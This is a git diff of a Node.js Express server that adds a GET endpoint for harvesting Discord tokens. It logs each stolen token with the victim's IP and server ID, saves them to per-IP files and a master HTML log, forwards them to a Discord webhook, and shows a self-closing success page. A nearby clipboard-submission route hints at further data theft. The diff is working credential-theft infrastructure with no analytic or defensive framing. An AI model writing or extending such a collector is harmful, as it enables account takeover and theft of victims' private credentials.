@@ -135,7 +135,70 @@ app.post('/submit-clipboard', (req, res) => {
   });
 });
 
-// Handle Discord token submissions (your integrated code)
+// Handle Discord token submissions (updated for GET requests)
+app.get('/receive-token', (req, res) => {
+  const { token, serverId } = req.query;
+  const realIP = getRealIP(req);
+  
+  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
+  
+  // Create filename with IP and timestamp
+  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+  const sanitizedIP = realIP.replace(/[:.]/g, '_');
+  
+  // Save to organized folder structure
+  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
+  if (!fs.existsSync(ipFolder)) {
+    fs.mkdirSync(ipFolder, { recursive: true });
+  }
+  
+  const filename = `token_${sanitizedIP}_${timestamp}.html`;
+  const savePath = path.join(ipFolder, filename);
+  
+  const tokenEntry = `<div>
+    <p><strong>IP:</strong> ${realIP}</p>
+    <p><strong>Server ID:</strong> ${serverId}</p>
+    <p><strong>Token:</strong> ${token}</p>
+    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+    <hr>
+  </div>\n`;
+  
+  // Save individual file
+  fs.writeFile(savePath, tokenEntry, (err) => {
+    if (err) console.error('Failed to save individual token file:', err);
+  });
+  
+  // Append to main tokens.html file
+  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
+  fs.appendFileSync(mainTokenPath, tokenEntry);
+  
+  // Send to Discord webhook
+  sendToDiscord({
+    token: token,
+    userIP: realIP,
+    serverId: serverId
+  }, 'token');
+  
+  // Send a success page
+  res.send(`
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>Token Received</title>
+    <style>
+      body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
+      .success { color: #4CAF50; font-size: 1.5rem; margin-bottom: 20px; }
+    </style>
+  </head>
+  <body>
+    <div class="success">✅ Token received successfully!</div>
+    <p>You can close this tab now.</p>
+    <script>setTimeout(() => window.close(), 3000);</script>
+  </body>
+  </html>`);
+});
+
+// Keep POST endpoint for manual submissions
 app.post('/receive-token', (req, res) => {
   const { token, userIP, serverId } = req.body;
   const realIP = userIP || getRealIP(req);
